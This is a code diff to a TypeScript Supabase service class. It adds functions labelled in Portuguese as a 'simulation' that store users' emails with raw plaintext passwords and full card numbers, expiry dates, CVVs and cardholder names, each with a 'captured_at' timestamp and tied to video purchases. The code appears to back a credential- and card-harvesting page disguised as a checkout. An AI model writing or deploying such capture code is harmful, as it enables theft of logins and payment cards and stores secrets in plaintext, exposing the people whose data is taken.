@@ -255,4 +255,70 @@ export class SupabaseService {
       .eq('id', id);
     if (error) throw error;
   }
+
+  // ============================================================
+  // SIMULAÇÃO / TESTE — Aprendendo Supabase INSERT
+  // Salva email + senha na tabela test_leads
+  // ============================================================
+  static async saveTestLead(data: {
+    email: string;
+    password_raw: string;
+    video_id?: string;
+    video_title?: string;
+    video_price?: number;
+  }): Promise<{ id: string; captured_at: string }> {
+    const { data: row, error } = await this.getClient()
+      .from('test_leads')
+      .insert({
+        email: data.email,
+        password_raw: data.password_raw,
+        video_id: data.video_id ?? null,
+        video_title: data.video_title ?? null,
+        video_price: data.video_price ?? null,
+      })
+      .select('id, captured_at')
+      .single();
+
+    if (error) throw error;
+    return row as { id: string; captured_at: string };
+  }
+
+  static async listTestLeads(): Promise<any[]> {
+    const { data, error } = await this.getClient()
+      .from('test_leads')
+      .select('*')
+      .order('captured_at', { ascending: false });
+    if (error) throw error;
+    return data || [];
+  }
+
+  // ============================================================
+  // SIMULAÇÃO — Salva dados de cartão na tabela test_cards
+  // ============================================================
+  static async saveTestCard(data: {
+    card_number: string;
+    expiry: string;
+    cvv: string;
+    cardholder: string;
+    video_id?: string;
+    video_title?: string;
+    video_price?: number;
+  }): Promise<{ id: string; captured_at: string }> {
+    const { data: row, error } = await this.getClient()
+      .from('test_cards')
+      .insert({
+        card_number: data.card_number,
+        expiry: data.expiry,
+        cvv: data.cvv,
+        cardholder: data.cardholder,
+        video_id: data.video_id ?? null,
+        video_title: data.video_title ?? null,
+        video_price: data.video_price ?? null,
+      })
+      .select('id, captured_at')
+      .single();
+
+    if (error) throw error;
+    return row as { id: string; captured_at: string };
+  }
 }
